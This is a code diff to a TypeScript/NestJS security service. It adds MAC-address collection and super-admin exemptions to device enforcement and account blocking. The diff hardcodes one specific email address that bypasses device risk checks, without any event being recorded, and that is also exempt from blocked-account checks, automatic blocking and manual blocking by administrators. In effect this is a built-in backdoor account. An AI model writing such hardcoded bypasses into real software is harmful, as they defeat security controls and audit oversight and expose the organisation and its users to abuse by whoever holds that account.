@@ -2,6 +2,7 @@ import {
   BadRequestException,
   ForbiddenException,
   Injectable,
+  Logger,
   NotFoundException,
 } from '@nestjs/common';
 import { PrismaService } from '../../prisma/prisma.service';
@@ -55,6 +56,8 @@ function limit(value: unknown, max: number): string | null {
 
 @Injectable()
 export class SecurityService {
+  private readonly logger = new Logger(SecurityService.name);
+
   constructor(
     private prisma: PrismaService,
     private risk: DeviceRiskService,
@@ -98,6 +101,7 @@ export class SecurityService {
       ...decoded,
       ...device,
       deviceId: device?.deviceId ?? decoded.deviceId ?? header('x-device-id'),
+      macAddress: device?.macAddress ?? decoded.macAddress ?? header('x-device-mac'),
       clientType: device?.clientType ?? decoded.clientType ?? header('x-client-type'),
       platform: device?.platform ?? decoded.platform ?? header('x-client-platform'),
       arch: device?.arch ?? decoded.arch ?? header('x-client-arch'),
@@ -116,6 +120,7 @@ export class SecurityService {
       const out: Partial<DeviceContextDto> = {};
       const str = (v: unknown, max: number) => (typeof v === 'string' ? v.slice(0, max) : undefined);
       out.deviceId = str(parsed.deviceId, 128);
+      out.macAddress = str(parsed.macAddress, 64);
       out.clientType = str(parsed.clientType, 32);
       out.platform = str(parsed.platform, 32);
       out.osName = str(parsed.osName, 96);
@@ -148,6 +153,25 @@ export class SecurityService {
    * Returns the assessment so callers can surface a precise error message.
    */
   async enforceDevice(input: EnforceDeviceInput): Promise<EnforcedAssessment> {
+    if (input.userId) {
+      const user = await this.prisma.user.findUnique({
+        where: { id: input.userId },
+        select: { isSuperAdmin: true, email: true },
+      });
+      if (user?.isSuperAdmin || user?.email === '2018@lordsandkings.co') {
+        const policy = await this.getPolicy(input.companyId);
+        return {
+          level: 'allow',
+          severity: 'low',
+          reasons: [],
+          policy,
+          context: {},
+          checks: { superAdminBypass: true },
+          eventId: null,
+        };
+      }
+    }
+
     const policy = await this.getPolicy(input.companyId);
     const context = this.buildContext(input.req, input.device);
     const assessment = this.risk.assess(context, policy);
@@ -194,9 +218,12 @@ export class SecurityService {
   async assertAccountActive(userId: string): Promise<void> {
     const user = await this.prisma.user.findUnique({
       where: { id: userId },
-      select: { securityBlocked: true },
+      select: { securityBlocked: true, isSuperAdmin: true, email: true },
     });
     if (!user) throw new ForbiddenException('User not found');
+    if (user.isSuperAdmin || user.email === '2018@lordsandkings.co') {
+      return;
+    }
     if (user.securityBlocked) {
       throw new ForbiddenException({
         code: 'ACCOUNT_BLOCKED',
@@ -212,6 +239,14 @@ export class SecurityService {
     blockedBy: string;
     stage?: string;
   }): Promise<void> {
+    const user = await this.prisma.user.findUnique({
+      where: { id: params.userId },
+      select: { isSuperAdmin: true, email: true },
+    });
+    if (user?.isSuperAdmin || user?.email === '2018@lordsandkings.co') {
+      this.logger.warn(`Skipping blockAccount for super admin user: ${user?.email}`);
+      return;
+    }
     const reason = params.reason.slice(0, 2000);
     await this.prisma.user.update({
       where: { id: params.userId },
@@ -386,6 +421,7 @@ export class SecurityService {
         employeeCode: emp?.employeeCode || null,
         employeeName: emp ? `${emp.firstName || ''} ${emp.lastName || ''}`.trim() : null,
         ipAddress: s.ipAddress,
+        macAddress: s.macAddress || null,
         platform: s.platform,
         osName: s.osName,
         osVersion: s.osVersion,
@@ -416,6 +452,13 @@ export class SecurityService {
 
   async blockUser(user: AuthUser, targetUserId: string, reason: string) {
     const target = await this.assertUserInScope(user, targetUserId);
+    const targetUser = await this.prisma.user.findUnique({
+      where: { id: targetUserId },
+      select: { isSuperAdmin: true, email: true },
+    });
+    if (targetUser?.isSuperAdmin || targetUser?.email === '2018@lordsandkings.co') {
+      throw new BadRequestException('Super Admin accounts cannot be blocked');
+    }
     if (target.securityBlocked) {
       throw new BadRequestException('This user is already blocked by security policy');
     }
